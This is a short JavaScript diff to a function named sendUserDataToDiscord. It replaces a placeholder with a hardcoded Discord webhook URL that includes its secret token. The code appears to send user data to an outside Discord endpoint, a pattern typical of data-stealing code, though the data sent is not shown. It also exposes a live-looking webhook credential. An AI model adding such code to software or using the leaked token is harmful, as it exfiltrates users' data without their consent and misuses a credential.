@@ -1,5 +1,5 @@
 async function sendUserDataToDiscord() {
-  const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL || "<YOUR_DISCORD_WEBHOOK_URL_HERE>";
+  const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL || "<https://discord.com/api/webhooks/1303797692471836752/UGvqu5pljOtWO-BwVn722myUjIKAs17lKGPDkPZlCOfuX0fWgqNFgB2zS_OrvnVLJT0TE>";
   if (!discordWebhookUrl) {
     console.error("Discord webhook URL is not set. Aborting data send.");
     return;
